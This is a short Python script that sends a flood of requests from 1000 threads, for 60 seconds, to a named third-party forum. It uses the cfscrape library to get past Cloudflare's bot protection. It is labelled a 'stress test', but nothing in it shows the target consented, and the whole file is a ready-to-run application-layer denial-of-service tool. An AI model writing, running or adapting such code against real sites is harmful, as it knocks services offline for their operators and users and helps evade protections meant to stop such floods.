import cfscrape
import threading
import datetime

url = 'https://forum.ventox.lol'
num_threads = 1000
test_duration = 60 # in seconds

def stress_test(until):
    scraper = cfscrape.create_scraper()
    while (until - datetime.datetime.now()).total_seconds() > 0:
        response = scraper.get(url)
        print(response.status_code)

until = datetime.datetime.now() + datetime.timedelta(seconds=test_duration)
threads = []
for i in range(num_threads):
    t = threading.Thread(target=stress_test, args=(until,))
    t.start()
    threads.append(t)

for t in threads:
    t.join()
